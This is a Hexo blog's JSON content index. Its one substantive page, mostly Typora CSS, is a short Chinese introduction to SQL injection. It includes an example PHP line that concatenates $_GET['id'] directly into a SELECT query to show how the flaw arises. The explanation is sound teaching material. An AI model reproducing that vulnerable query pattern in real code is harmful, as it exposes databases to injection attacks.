{"meta":{"title":"惊鸿","subtitle":null,"description":null,"author":"惊鸿","url":"http://yoursite.com","root":"/"},"pages":[{"title":"","date":"2019-08-07T09:05:57.843Z","updated":"2019-07-22T02:11:18.089Z","comments":true,"path":"web安全/WAF.html","permalink":"http://yoursite.com/web安全/WAF.html","excerpt":"","text":""},{"title":"Sql","date":"2019-08-07T08:51:44.000Z","updated":"2019-08-07T08:56:01.152Z","comments":true,"path":"Sql/index.html","permalink":"http://yoursite.com/Sql/index.html","excerpt":"","text":"sql注入的基础html {overflow-x: initial !important;}:root { --bg-color:#ffffff; --text-color:#333333; --select-text-bg-color:#B5D6FC; --select-text-font-color:auto; --monospace:\"Lucida Console\",Consolas,\"Courier\",monospace; } html { font-size: 14px; background-color: var(--bg-color); color: var(--text-color); font-family: \"Helvetica Neue\", Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; } body { margin: 0px; padding: 0px; height: auto; bottom: 0px; top: 0px; left: 0px; right: 0px; font-size: 1rem; line-height: 1.42857; overflow-x: hidden; background: inherit; tab-size: 4; } iframe { margin: auto; } a.url { word-break: break-all; } a:active, a:hover { outline: 0px; } .in-text-selection, ::selection { text-shadow: none; background: var(--select-text-bg-color); color: var(--select-text-font-color); } #write { margin: 0px auto; height: auto; width: inherit; word-break: normal; overflow-wrap: break-word; position: relative; white-space: normal; overflow-x: visible; padding-top: 40px; } #write.first-line-indent p { text-indent: 2em; } #write.first-line-indent li p, #write.first-line-indent p * { text-indent: 0px; } #write.first-line-indent li { margin-left: 2em; } .for-image #write { padding-left: 8px; padding-right: 8px; } body.typora-export { padding-left: 30px; padding-right: 30px; } .typora-export .footnote-line, .typora-export li, .typora-export p { white-space: pre-wrap; } @media screen and (max-width: 500px) { body.typora-export { padding-left: 0px; padding-right: 0px; } #write { padding-left: 20px; padding-right: 20px; } .CodeMirror-sizer { margin-left: 0px !important; } .CodeMirror-gutters { display: none !important; } } #write li > figure:last-child { margin-bottom: 0.5rem; } #write ol, #write ul { position: relative; } img { max-width: 100%; vertical-align: middle; } button, input, select, textarea { color: inherit; font: inherit; } input[type=\"checkbox\"], input[type=\"radio\"] { line-height: normal; padding: 0px; } *, ::after, ::before { box-sizing: border-box; } #write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p, #write pre { width: inherit; } #write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p { position: relative; } p { line-height: inherit; } h1, h2, h3, h4, h5, h6 { break-after: avoid-page; break-inside: avoid; orphans: 2; } p { orphans: 4; } h1 { font-size: 2rem; } h2 { font-size: 1.8rem; } h3 { font-size: 1.6rem; } h4 { font-size: 1.4rem; } h5 { font-size: 1.2rem; } h6 { font-size: 1rem; } .md-math-block, .md-rawblock, h1, h2, h3, h4, h5, h6, p { margin-top: 1rem; margin-bottom: 1rem; } .hidden { display: none; } .md-blockmeta { color: rgb(204, 204, 204); font-weight: 700; font-style: italic; } a { cursor: pointer; } sup.md-footnote { padding: 2px 4px; background-color: rgba(238, 238, 238, 0.7); color: rgb(85, 85, 85); border-radius: 4px; cursor: pointer; } sup.md-footnote a, sup.md-footnote a:hover { color: inherit; text-transform: inherit; text-decoration: inherit; } #write input[type=\"checkbox\"] { cursor: pointer; width: inherit; height: inherit; } figure { overflow-x: auto; margin: 1.2em 0px; max-width: calc(100% + 16px); padding: 0px; } figure > table { margin: 0px !important; } tr { break-inside: avoid; break-after: auto; } thead { display: table-header-group; } table { border-collapse: collapse; border-spacing: 0px; width: 100%; overflow: auto; break-inside: auto; text-align: left; } table.md-table td { min-width: 32px; } .CodeMirror-gutters { border-right: 0px; background-color: inherit; } .CodeMirror-linenumber { user-select: none; } .CodeMirror { text-align: left; } .CodeMirror-placeholder { opacity: 0.3; } .CodeMirror pre { padding: 0px 4px; } .CodeMirror-lines { padding: 0px; } div.hr:focus { cursor: none; } #write pre { white-space: pre-wrap; } #write.fences-no-line-wrapping pre { white-space: pre; } #write pre.ty-contain-cm { white-space: normal; } .CodeMirror-gutters { margin-right: 4px; } .md-fences { font-size: 0.9rem; display: block; break-inside: avoid; text-align: left; overflow: visible; white-space: pre; background: inherit; position: relative !important; } .md-diagram-panel { width: 100%; margin-top: 10px; text-align: center; padding-top: 0px; padding-bottom: 8px; overflow-x: auto; } #write .md-fences.mock-cm { white-space: pre-wrap; } .md-fences.md-fences-with-lineno { padding-left: 0px; } #write.fences-no-line-wrapping .md-fences.mock-cm { white-space: pre; overflow-x: auto; } .md-fences.mock-cm.md-fences-with-lineno { padding-left: 8px; } .CodeMirror-line, twitterwidget { break-inside: avoid; } .footnotes { opacity: 0.8; font-size: 0.9rem; margin-top: 1em; margin-bottom: 1em; } .footnotes + .footnotes { margin-top: 0px; } .md-reset { margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: top; background: 0px 0px; text-decoration: none; text-shadow: none; float: none; position: static; width: auto; height: auto; white-space: nowrap; cursor: inherit; -webkit-tap-highlight-color: transparent; line-height: normal; font-weight: 400; text-align: left; box-sizing: content-box; direction: ltr; } li div { padding-top: 0px; } blockquote { margin: 1rem 0px; } li .mathjax-block, li p { margin: 0.5rem 0px; } li { margin: 0px; position: relative; } blockquote > :last-child { margin-bottom: 0px; } blockquote > :first-child, li > :first-child { margin-top: 0px; } .footnotes-area { color: rgb(136, 136, 136); margin-top: 0.714rem; padding-bottom: 0.143rem; white-space: normal; } #write .footnote-line { white-space: pre-wrap; } @media print { body, html { border: 1px solid transparent; height: 99%; break-after: avoid; break-before: avoid; } #write { margin-top: 0px; padding-top: 0px; border-color: transparent !important; } .typora-export * { -webkit-print-color-adjust: exact; } html.blink-to-pdf { font-size: 13px; } .typora-export #write { padding-left: 32px; padding-right: 32px; padding-bottom: 0px; break-after: avoid; } .typora-export #write::after { height: 0px; } } .footnote-line { margin-top: 0.714em; font-size: 0.7em; } a img, img a { cursor: pointer; } pre.md-meta-block { font-size: 0.8rem; min-height: 0.8rem; white-space: pre-wrap; background: rgb(204, 204, 204); display: block; overflow-x: hidden; } p > .md-image:only-child:not(.md-img-error) img, p > img:only-child { display: block; margin: auto; } p > .md-image:only-child { display: inline-block; width: 100%; } #write .MathJax_Display { margin: 0.8em 0px 0px; } .md-math-block { width: 100%; } .md-math-block:not(:empty)::after { display: none; } [contenteditable=\"true\"]:active, [contenteditable=\"true\"]:focus { outline: 0px; box-shadow: none; } .md-task-list-item { position: relative; list-style-type: none; } .task-list-item.md-task-list-item { padding-left: 0px; } .md-task-list-item > input { position: absolute; top: 0px; left: 0px; margin-left: -1.2em; margin-top: calc(1em - 10px); border: none; } .math { font-size: 1rem; } .md-toc { min-height: 3.58rem; position: relative; font-size: 0.9rem; border-radius: 10px; } .md-toc-content { position: relative; margin-left: 0px; } .md-toc-content::after, .md-toc::after { display: none; } .md-toc-item { display: block; color: rgb(65, 131, 196); } .md-toc-item a { text-decoration: none; } .md-toc-inner:hover { text-decoration: underline; } .md-toc-inner { display: inline-block; cursor: pointer; } .md-toc-h1 .md-toc-inner { margin-left: 0px; font-weight: 700; } .md-toc-h2 .md-toc-inner { margin-left: 2em; } .md-toc-h3 .md-toc-inner { margin-left: 4em; } .md-toc-h4 .md-toc-inner { margin-left: 6em; } .md-toc-h5 .md-toc-inner { margin-left: 8em; } .md-toc-h6 .md-toc-inner { margin-left: 10em; } @media screen and (max-width: 48em) { .md-toc-h3 .md-toc-inner { margin-left: 3.5em; } .md-toc-h4 .md-toc-inner { margin-left: 5em; } .md-toc-h5 .md-toc-inner { margin-left: 6.5em; } .md-toc-h6 .md-toc-inner { margin-left: 8em; } } a.md-toc-inner { font-size: inherit; font-style: inherit; font-weight: inherit; line-height: inherit; } .footnote-line a:not(.reversefootnote) { color: inherit; } .md-attr { display: none; } .md-fn-count::after { content: \".\"; } code, pre, samp, tt { font-family: var(--monospace); } kbd { margin: 0px 0.1em; padding: 0.1em 0.6em; font-size: 0.8em; color: rgb(36, 39, 41); background: rgb(255, 255, 255); border: 1px solid rgb(173, 179, 185); border-radius: 3px; box-shadow: rgba(12, 13, 14, 0.2) 0px 1px 0px, rgb(255, 255, 255) 0px 0px 0px 2px inset; white-space: nowrap; vertical-align: middle; } .md-comment { color: rgb(162, 127, 3); opacity: 0.8; font-family: var(--monospace); } code { text-align: left; vertical-align: initial; } a.md-print-anchor { white-space: pre !important; border-width: initial !important; border-style: none !important; border-color: initial !important; display: inline-block !important; position: absolute !important; width: 1px !important; right: 0px !important; outline: 0px !important; background: 0px 0px !important; text-decoration: initial !important; text-shadow: initial !important; } .md-inline-math .MathJax_SVG .noError { display: none !important; } .html-for-mac .inline-math-svg .MathJax_SVG { vertical-align: 0.2px; } .md-math-block .MathJax_SVG_Display { text-align: center; margin: 0px; position: relative; text-indent: 0px; max-width: none; max-height: none; min-height: 0px; min-width: 100%; width: auto; overflow-y: hidden; display: block !important; } .MathJax_SVG_Display, .md-inline-math .MathJax_SVG_Display { width: auto; margin: inherit; display: inline-block !important; } .MathJax_SVG .MJX-monospace { font-family: var(--monospace); } .MathJax_SVG .MJX-sans-serif { font-family: sans-serif; } .MathJax_SVG { display: inline; font-style: normal; font-weight: 400; line-height: normal; zoom: 90%; text-indent: 0px; text-align: left; text-transform: none; letter-spacing: normal; word-spacing: normal; overflow-wrap: normal; white-space: nowrap; float: none; direction: ltr; max-width: none; max-height: none; min-width: 0px; min-height: 0px; border: 0px; padding: 0px; margin: 0px; } .MathJax_SVG * { transition: none 0s ease 0s; } .MathJax_SVG_Display svg { vertical-align: middle !important; margin-bottom: 0px !important; margin-top: 0px !important; } .os-windows.monocolor-emoji .md-emoji { font-family: \"Segoe UI Symbol\", sans-serif; } .md-diagram-panel > svg { max-width: 100%; } [lang=\"mermaid\"] svg, [lang=\"flow\"] svg { max-width: 100%; height: auto; } [lang=\"mermaid\"] .node text { font-size: 1rem; } table tr th { border-bottom: 0px; } video { max-width: 100%; display: block; margin: 0px auto; } iframe { max-width: 100%; width: 100%; border: none; } .highlight td, .highlight tr { border: 0px; } .CodeMirror { height: auto; }.CodeMirror.cm-s-inner { background: inherit; }.CodeMirror-scroll { overflow: auto hidden; z-index: 3; }.CodeMirror-gutter-filler, .CodeMirror-scrollbar-filler { background-color: rgb(255, 255, 255); }.CodeMirror-gutters { border-right: 1px solid rgb(221, 221, 221); background: inherit; white-space: nowrap; }.CodeMirror-linenumber { padding: 0px 3px 0px 5px; text-align: right; color: rgb(153, 153, 153); }.cm-s-inner .cm-keyword { color: rgb(119, 0, 136); }.cm-s-inner .cm-atom, .cm-s-inner.cm-atom { color: rgb(34, 17, 153); }.cm-s-inner .cm-number { color: rgb(17, 102, 68); }.cm-s-inner .cm-def { color: rgb(0, 0, 255); }.cm-s-inner .cm-variable { color: rgb(0, 0, 0); }.cm-s-inner .cm-variable-2 { color: rgb(0, 85, 170); }.cm-s-inner .cm-variable-3 { color: rgb(0, 136, 85); }.cm-s-inner .cm-string { color: rgb(170, 17, 17); }.cm-s-inner .cm-property { color: rgb(0, 0, 0); }.cm-s-inner .cm-operator { color: rgb(152, 26, 26); }.cm-s-inner .cm-comment, .cm-s-inner.cm-comment { color: rgb(170, 85, 0); }.cm-s-inner .cm-string-2 { color: rgb(255, 85, 0); }.cm-s-inner .cm-meta { color: rgb(85, 85, 85); }.cm-s-inner .cm-qualifier { color: rgb(85, 85, 85); }.cm-s-inner .cm-builtin { color: rgb(51, 0, 170); }.cm-s-inner .cm-bracket { color: rgb(153, 153, 119); }.cm-s-inner .cm-tag { color: rgb(17, 119, 0); }.cm-s-inner .cm-attribute { color: rgb(0, 0, 204); }.cm-s-inner .cm-header, .cm-s-inner.cm-header { color: rgb(0, 0, 255); }.cm-s-inner .cm-quote, .cm-s-inner.cm-quote { color: rgb(0, 153, 0); }.cm-s-inner .cm-hr, .cm-s-inner.cm-hr { color: rgb(153, 153, 153); }.cm-s-inner .cm-link, .cm-s-inner.cm-link { color: rgb(0, 0, 204); }.cm-negative { color: rgb(221, 68, 68); }.cm-positive { color: rgb(34, 153, 34); }.cm-header, .cm-strong { font-weight: 700; }.cm-del { text-decoration: line-through; }.cm-em { font-style: italic; }.cm-link { text-decoration: underline; }.cm-error { color: red; }.cm-invalidchar { color: red; }.cm-constant { color: rgb(38, 139, 210); }.cm-defined { color: rgb(181, 137, 0); }div.CodeMirror span.CodeMirror-matchingbracket { color: rgb(0, 255, 0); }div.CodeMirror span.CodeMirror-nonmatchingbracket { color: rgb(255, 34, 34); }.cm-s-inner .CodeMirror-activeline-background { background: inherit; }.CodeMirror { position: relative; overflow: hidden; }.CodeMirror-scroll { height: 100%; outline: 0px; position: relative; box-sizing: content-box; background: inherit; }.CodeMirror-sizer { position: relative; }.CodeMirror-gutter-filler, .CodeMirror-hscrollbar, .CodeMirror-scrollbar-filler, .CodeMirror-vscrollbar { position: absolute; z-index: 6; display: none; }.CodeMirror-vscrollbar { right: 0px; top: 0px; overflow: hidden; }.CodeMirror-hscrollbar { bottom: 0px; left: 0px; overflow: hidden; }.CodeMirror-scrollbar-filler { right: 0px; bottom: 0px; }.CodeMirror-gutter-filler { left: 0px; bottom: 0px; }.CodeMirror-gutters { position: absolute; left: 0px; top: 0px; padding-bottom: 30px; z-index: 3; }.CodeMirror-gutter { white-space: normal; height: 100%; box-sizing: content-box; padding-bottom: 30px; margin-bottom: -32px; display: inline-block; }.CodeMirror-gutter-wrapper { position: absolute; z-index: 4; background: 0px 0px !important; border: none !important; }.CodeMirror-gutter-background { position: absolute; top: 0px; bottom: 0px; z-index: 4; }.CodeMirror-gutter-elt { position: absolute; cursor: default; z-index: 4; }.CodeMirror-lines { cursor: text; }.CodeMirror pre { border-radius: 0px; border-width: 0px; background: 0px 0px; font-family: inherit; font-size: inherit; margin: 0px; white-space: pre; overflow-wrap: normal; color: inherit; z-index: 2; position: relative; overflow: visible; }.CodeMirror-wrap pre { overflow-wrap: break-word; white-space: pre-wrap; word-break: normal; }.CodeMirror-code pre { border-right: 30px solid transparent; width: fit-content; }.CodeMirror-wrap .CodeMirror-code pre { border-right: none; width: auto; }.CodeMirror-linebackground { position: absolute; left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: 0; }.CodeMirror-linewidget { position: relative; z-index: 2; overflow: auto; }.CodeMirror-wrap .CodeMirror-scroll { overflow-x: hidden; }.CodeMirror-measure { position: absolute; width: 100%; height: 0px; overflow: hidden; visibility: hidden; }.CodeMirror-measure pre { position: static; }.CodeMirror div.CodeMirror-cursor { position: absolute; visibility: hidden; border-right: none; width: 0px; }.CodeMirror div.CodeMirror-cursor { visibility: hidden; }.CodeMirror-focused div.CodeMirror-cursor { visibility: inherit; }.cm-searching { background: rgba(255, 255, 0, 0.4); }@media print { .CodeMirror div.CodeMirror-cursor { visibility: hidden; }} .cm-s-inner .cm-variable, .cm-s-inner .cm-operator, .cm-s-inner .cm-property { color: rgb(184, 191, 198); }.cm-s-inner .cm-keyword { color: rgb(200, 143, 208); }.cm-s-inner .cm-tag { color: rgb(125, 244, 106); }.cm-s-inner .cm-attribute { color: rgb(117, 117, 228); }.CodeMirror div.CodeMirror-cursor { border-left: 1px solid rgb(184, 191, 198); z-index: 3; }.cm-s-inner .cm-string { color: rgb(210, 107, 107); }.cm-s-inner .cm-comment, .cm-s-inner.cm-comment { color: rgb(218, 146, 74); }.cm-s-inner .cm-header, .cm-s-inner .cm-def, .cm-s-inner.cm-header, .cm-s-inner.cm-def { color: rgb(141, 141, 240); }.cm-s-inner .cm-quote, .cm-s-inner.cm-quote { color: rgb(87, 172, 87); }.cm-s-inner .cm-hr { color: rgb(216, 213, 213); }.cm-s-inner .cm-link { color: rgb(211, 211, 239); }.cm-s-inner .cm-negative { color: rgb(217, 80, 80); }.cm-s-inner .cm-positive { color: rgb(80, 230, 80); }.cm-s-inner .cm-string-2 { color: rgb(255, 85, 0); }.cm-s-inner .cm-meta, .cm-s-inner .cm-qualifier { color: rgb(183, 179, 179); }.cm-s-inner .cm-builtin { color: rgb(243, 179, 248); }.cm-s-inner .cm-bracket { color: rgb(153, 153, 119); }.cm-s-inner .cm-atom, .cm-s-inner.cm-atom { color: rgb(132, 182, 203); }.cm-s-inner .cm-number { color: rgb(100, 171, 143); }.cm-s-inner .cm-variable { color: rgb(184, 191, 198); }.cm-s-inner .cm-variable-2 { color: rgb(159, 186, 213); }.cm-s-inner .cm-variable-3 { color: rgb(28, 198, 133); }.CodeMirror-selectedtext, .CodeMirror-selected { background: rgb(74, 137, 220); text-shadow: none; color: rgb(255, 255, 255) !important; }.CodeMirror-gutters { border-right: none; } :root { –bg-color: #363B40; –side-bar-bg-color: #2E3033; –text-color: #b8bfc6; –select-text-bg-color:#4a89dc; –control-text-color: #b7b7b7; –control-text-hover-color: #eee; –window-border: 1px solid #555; –active-file-bg-color: rgb(34, 34, 34); –active-file-border-color: #8d8df0; –active-file-text-color: white; –item-hover-bg-color: #70717d; –item-hover-text-color: white; –primary-color: #6dc1e7; –rawblock-edit-panel-bd: #333; }html { font-size: 16px; }html, body { text-size-adjust: 100%; background: var(–bg-color); fill: currentcolor; line-height: 1.625rem; } #write { max-width: 914px; }html, body, button, input, select, textarea, div.code-tooltip-content { color: rgb(184, 191, 198); border-color: transparent; }div.code-tooltip, .md-hover-tip .md-arrow::after { background: rgb(51, 51, 51); }.popover.bottom &gt; .arrow::after { border-bottom-color: rgb(51, 51, 51); }html, body, button, input, select, textarea { font-family: “Helvetica Neue”, Helvetica, Arial, sans-serif; }hr { height: 2px; border: 0px; margin: 24px 0px !important; }h1, h2, h3, h4, h5, h6 { font-family: “Lucida Grande”, Corbel, sans-serif; font-weight: normal; clear: both; overflow-wrap: break-word; margin: 0px; padding: 0px; color: rgb(222, 222, 222); }h1 { font-size: 2.5rem; line-height: 2.75rem; margin-bottom: 1.5rem; letter-spacing: -1.5px; }h2 { font-size: 1.63rem; line-height: 1.875rem; margin-bottom: 1.5rem; letter-spacing: -1px; font-weight: bold; }h3 { font-size: 1.17rem; line-height: 1.5rem; margin-bottom: 1.5rem; letter-spacing: -1px; font-weight: bold; }h4 { font-size: 1.12rem; line-height: 1.375rem; margin-bottom: 1.5rem; color: white; }h5 { font-size: 0.97rem; line-height: 1.25rem; margin-bottom: 1.5rem; font-weight: bold; }h6 { font-size: 0.93rem; line-height: 1rem; margin-bottom: 0.75rem; color: white; }@media (min-width: 980px) { h3.md-focus::before, h4.md-focus::before, h5.md-focus::before, h6.md-focus::before { color: rgb(221, 221, 221); border: 1px solid rgb(221, 221, 221); border-radius: 3px; position: absolute; left: -1.64286rem; top: 0.357143rem; float: left; font-size: 9px; padding-left: 2px; padding-right: 2px; vertical-align: bottom; font-weight: normal; line-height: normal; } h3.md-focus::before { content: “h3”; } h4.md-focus::before { content: “h4”; } h5.md-focus::before { content: “h5”; top: 0px; } h6.md-focus::before { content: “h6”; top: 0px; }}a { text-decoration: none; outline: 0px; }a:hover { outline: 0px; }a:focus { outline: dotted thin; }sup.md-footnote { background-color: rgb(85, 85, 85); color: rgb(221, 221, 221); }p { overflow-wrap: break-word; }p, ul, dd, ol, hr, address, pre, table, iframe, .wp-caption, .wp-audio-shortcode, .wp-video-shortcode { margin-top: 0px; margin-bottom: 1.5rem; }li &gt; blockquote { margin-bottom: 0px; }audio:not([controls]) { display: none; }[hidden] { display: none; }.in-text-selection, ::selection { background: rgb(74, 137, 220); color: rgb(255, 255, 255); text-shadow: none; }ul, ol { padding: 0px 0px 0px 1.875rem; }ul { list-style: square; }ol { list-style: decimal; }ul ul, ol ol, ul ol, ol ul { margin: 0px; }b, th, dt, strong { font-weight: bold; }i, em, dfn, cite { font-style: italic; }blockquote { margin: 35px 0px 1.875rem 1.875rem; border-left: 2px solid rgb(71, 77, 84); padding-left: 30px; }pre, code, kbd, tt, var { background: rgba(0, 0, 0, 0.05); font-size: 0.875rem; font-family: Monaco, Consolas, “Andale Mono”, “DejaVu Sans Mono”, monospace; }kbd { padding: 2px 4px; font-size: 90%; color: rgb(255, 255, 255); background-color: rgb(51, 51, 51); border-radius: 3px; box-shadow: rgba(0, 0, 0, 0.25) 0px -1px 0px inset; }pre.md-fences { padding: 10px 10px 10px 30px; margin-bottom: 20px; background: rgb(51, 51, 51); }.CodeMirror-gutters { background: rgb(51, 51, 51); border-right: 1px solid transparent; }.enable-diagrams pre.md-fences[lang=”sequence”] .code-tooltip, .enable-diagrams pre.md-fences[lang=”flow”] .code-tooltip, .enable-diagrams pre.md-fences[lang=”mermaid”] .code-tooltip { bottom: -2.2em; right: 4px; }code, kbd, tt, var { padding: 2px 5px; }table { max-width: 100%; width: 100%; border-collapse: collapse; border-spacing: 0px; }th, td { padding: 5px 10px; vertical-align: top; }a { transition: all 0.2s ease-in-out 0s; }hr { background: rgb(71, 77, 84); }h1 { margin-top: 2em; }a { color: rgb(224, 224, 224); text-decoration: underline; }a:hover { color: rgb(255, 255, 255); }.md-inline-math script { color: rgb(129, 177, 219); }b, th, dt, strong { color: rgb(222, 222, 222); }mark { background: rgb(211, 212, 14); }blockquote { color: rgb(157, 162, 166); }table a { color: rgb(222, 222, 222); }th, td { border: 1px solid rgb(71, 77, 84); }.task-list { padding-left: 0px; }.md-task-list-item { padding-left: 1.25rem; }.md-task-list-item &gt; input { top: auto; }.md-task-list-item &gt; input::before { content: “”; display: inline-block; width: 0.875rem; height: 0.875rem; vertical-align: middle; text-align: center; border: 1px solid rgb(184, 191, 198); background-color: rgb(54, 59, 64); margin-top: -0.4rem; }.md-task-list-item &gt; input:checked::before, .md-task-list-item &gt; input[checked]::before { content: “√”; font-size: 0.625rem; line-height: 0.625rem; color: rgb(222, 222, 222); }.auto-suggest-container { border: 0px; background-color: rgb(82, 92, 101); } #typora-quick-open { background-color: rgb(82, 92, 101); } #typora-quick-open input { background-color: rgb(82, 92, 101); border-width: 0px 0px 1px; border-top-style: initial; border-right-style: initial; border-left-style: initial; border-top-color: initial; border-right-color: initial; border-left-color: initial; border-image: initial; border-bottom-style: solid; border-bottom-color: grey; }.typora-quick-open-item { background-color: inherit; color: inherit; }.typora-quick-open-item.active, .typora-quick-open-item:hover { background-color: rgb(77, 139, 219); color: white; }.typora-quick-open-item:hover { background-color: rgba(77, 139, 219, 0.8); }.typora-search-spinner &gt; div { background-color: rgb(255, 255, 255); } #write pre.md-meta-block { border-bottom: 1px dashed rgb(204, 204, 204); background: transparent; padding-bottom: 0.6em; line-height: 1.6em; }.btn, .btn .btn-default { background: transparent; color: rgb(184, 191, 198); }.ty-table-edit { border-top: 1px solid gray; background-color: rgb(54, 59, 64); }.popover-title { background: transparent; }.md-image &gt; .md-meta { color: rgb(187, 187, 187); background: transparent; }.md-expand.md-image &gt; .md-meta { color: rgb(221, 221, 221); } #write &gt; h3::before, #write &gt; h4::before, #write &gt; h5::before, #write &gt; h6::before { border: none; border-radius: 0px; color: rgb(136, 136, 136); text-decoration: underline; left: -1.4rem; top: 0.2rem; } #write &gt; h3.md-focus::before { top: 2px; } #write &gt; h4.md-focus::before { top: 2px; }.md-toc-item { color: rgb(168, 194, 220); } #write div.md-toc-tooltip { background-color: rgb(54, 59, 64); }.dropdown-menu .btn:hover, .dropdown-menu .btn:focus, .md-toc .btn:hover, .md-toc .btn:focus { color: white; background: black; } #toc-dropmenu { background: rgba(50, 54, 59, 0.93); border: 1px solid rgba(253, 253, 253, 0.15); } #toc-dropmenu .divider { background-color: rgb(155, 155, 155); }.outline-expander::before { top: 2px; } #typora-sidebar { box-shadow: none; border-right: none; }.sidebar-tabs { border-bottom: 0px; } #typora-sidebar:hover .outline-title-wrapper { border-left: 1px dashed; }.outline-title-wrapper .btn { color: inherit; }.outline-item:hover { border-color: rgb(54, 59, 64); background-color: rgb(54, 59, 64); color: white; }h1.md-focus .md-attr, h2.md-focus .md-attr, h3.md-focus .md-attr, h4.md-focus .md-attr, h5.md-focus .md-attr, h6.md-focus .md-attr, .md-header-span .md-attr { color: rgb(140, 142, 146); display: inline; }.md-comment { color: rgb(90, 149, 227); opacity: 1; }.md-inline-math g, .md-inline-math svg { stroke: rgb(184, 191, 198) !important; fill: rgb(184, 191, 198) !important; }[md-inline=”inline_math”] { color: rgb(156, 178, 233); } #math-inline-preview .md-arrow::after { background: black; }.modal-content { background: var(–bg-color); border: 0px; }.modal-title { font-size: 1.5em; }.modal-content input { background-color: rgba(26, 21, 21, 0.51); color: white; }.modal-content .input-group-addon { background-color: rgba(0, 0, 0, 0.17); color: white; }.modal-backdrop { background-color: rgba(174, 174, 174, 0.7); }.modal-content .btn-primary { border-color: var(–primary-color); }.md-table-resize-popover { background-color: rgb(51, 51, 51); }.form-inline .input-group .input-group-addon { color: white; } #md-searchpanel { border-bottom: 1px dashed grey; }.context-menu, #spell-check-panel, #footer-word-count-info { background-color: rgb(66, 70, 74); }.context-menu.dropdown-menu .divider, .dropdown-menu .divider { background-color: rgb(119, 119, 119); }footer { color: inherit; }@media (max-width: 1000px) { footer { border-top: none; } footer:hover { color: inherit; }} #file-info-file-path .file-info-field-value:hover { background-color: rgb(85, 85, 85); color: rgb(222, 222, 222); }.megamenu-content, .megamenu-opened header { background: var(–bg-color); }.megamenu-menu-panel h2, .megamenu-menu-panel h1, .long-btn { color: inherit; }.megamenu-menu-panel input[type=”text”] { background: inherit; border-width: 0px 0px 1px; border-top-style: initial; border-right-style: initial; border-left-style: initial; border-color: initial; border-image: initial; border-bottom-style: solid; } #recent-file-panel-action-btn { background: inherit; border: 1px solid grey; }.megamenu-menu-panel .dropdown-menu &gt; li &gt; a { color: inherit; background-color: rgb(47, 53, 58); text-decoration: none; }.megamenu-menu-panel table td:nth-child(1) { color: inherit; font-weight: bold; }.megamenu-menu-panel tbody tr:hover td:nth-child(1) { color: white; }.modal-footer .btn-default, .modal-footer .btn-primary, .modal-footer .btn-default:not(:hover) { border: 1px solid transparent; }.btn-default:hover, .btn-default:focus, .btn-default.focus, .btn-default:active, .btn-default.active, .open &gt; .dropdown-toggle.btn-default { color: white; border: 1px solid rgb(221, 221, 221); background-color: inherit; }.modal-header { border-bottom: 0px; }.modal-footer { border-top: 0px; } #recent-file-panel tbody tr:nth-child(2n-1) { background-color: transparent !important; }.megamenu-menu-panel tbody tr:hover td:nth-child(2) { color: inherit; }.megamenu-menu-panel .btn { border: 1px solid rgb(238, 238, 238); background: transparent; }.mouse-hover .toolbar-icon.btn:hover, #w-full.mouse-hover, #w-pin.mouse-hover { background-color: inherit; }.typora-node::-webkit-scrollbar { width: 5px; }.typora-node::-webkit-scrollbar-thumb:vertical { background: rgba(250, 250, 250, 0.3); }.typora-node::-webkit-scrollbar-thumb:vertical:active { background: rgba(250, 250, 250, 0.5); } #w-unpin { background-color: rgb(65, 130, 196); } #top-titlebar, #top-titlebar * { color: var(–item-hover-text-color); }.typora-sourceview-on #toggle-sourceview-btn, #footer-word-count:hover, .ty-show-word-count #footer-word-count { background: rgb(51, 51, 51); } #toggle-sourceview-btn:hover { color: rgb(238, 238, 238); background: rgb(51, 51, 51); }.on-focus-mode .md-end-block:not(.md-focus):not(.md-focus-container) * { color: rgb(104, 104, 104) !important; }.on-focus-mode .md-end-block:not(.md-focus) img, .on-focus-mode .md-task-list-item:not(.md-focus-container) &gt; input { }.on-focus-mode li[cid]:not(.md-focus-container) { color: rgb(104, 104, 104); }.on-focus-mode .md-fences.md-focus .CodeMirror-code &gt; :not(.CodeMirror-activeline) *, .on-focus-mode .CodeMirror.cm-s-inner:not(.CodeMirror-focused) * { color: rgb(104, 104, 104) !important; }.on-focus-mode .md-focus, .on-focus-mode .md-focus-container { color: rgb(255, 255, 255); }.on-focus-mode #typora-source .CodeMirror-code &gt; :not(.CodeMirror-activeline) * { color: rgb(104, 104, 104) !important; } #write .md-focus .md-diagram-panel { border: 1px solid rgb(221, 221, 221); margin-left: -1px; width: calc(100% + 2px); } #write .md-focus.md-fences-with-lineno .md-diagram-panel { margin-left: auto; }.md-diagram-panel-error { color: rgb(241, 144, 142); }.active-tab-files #info-panel-tab-file, .active-tab-files #info-panel-tab-file:hover, .active-tab-outline #info-panel-tab-outline, .active-tab-outline #info-panel-tab-outline:hover { color: rgb(238, 238, 238); }.sidebar-footer-item:hover, .footer-item:hover { background: inherit; color: white; }.ty-side-sort-btn.active, .ty-side-sort-btn:hover, .selected-folder-menu-item a::after { color: white; } #sidebar-files-menu { border: 1px solid; box-shadow: rgba(0, 0, 0, 0.79) 4px 4px 20px; background-color: var(–bg-color); }.file-list-item { border-bottom: none; }.file-list-item-summary { opacity: 1; }.file-list-item.active:first-child { border-top: none; }.file-node-background { height: 32px; }.file-library-node.active &gt; .file-node-content, .file-list-item.active { color: var(–active-file-text-color); }.file-library-node.active &gt; .file-node-background { background-color: var(–active-file-bg-color); }.file-list-item.active { background-color: var(–active-file-bg-color); } #ty-tooltip { background-color: black; color: rgb(238, 238, 238); }.md-task-list-item &gt; input { margin-left: -1.3em; margin-top: 0.3rem; -webkit-appearance: none; }.md-mathjax-midline { background-color: rgb(87, 97, 107); border-bottom: none; }footer.ty-footer { border-color: rgb(101, 101, 101); } web安全之SQL注入基础SQL注入基础SQL注入介绍Web请求响应过程： 什么是SQL注入？就是指web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。为什么会产生sql注入?开发人员可以使用动态SQL语句创建通用，灵活的应用。动态SQL语句是在执行过程中构造的，它根据不同的条件产生不同的sql语句。当开发人员在运行过程中需要根据不同的查询标准决定提取什么字段（如select语句）,或者根据不同的条件选择不同的查询表时，动态地构造SQL语句会非常有用。Php语句为列：$query=“SELECT * FROM users WHERE id = $_GET[‘id’]”;由于这里的参数ID可控，且带入数据库查询，所以非法用户可以任意拼接SQL语句进行攻击。 